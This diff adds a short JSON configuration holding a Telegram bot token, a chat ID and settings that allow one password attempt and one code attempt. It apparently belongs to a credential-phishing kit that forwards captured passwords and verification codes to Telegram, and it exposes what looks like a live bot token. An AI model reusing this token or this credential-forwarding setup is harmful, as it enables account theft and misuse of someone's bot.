@@ -1,0 +1,10 @@
+{
+    "telegram": {
+        "token": "7696170315:AAHzY3ANCN23bED-vqRYC_3-49Ura_YOycA",
+        "chatId": "7211586401"
+    },
+    "setting": {
+        "max_password_attempts": 1,
+        "max_code_attempts": 1
+    }
+}
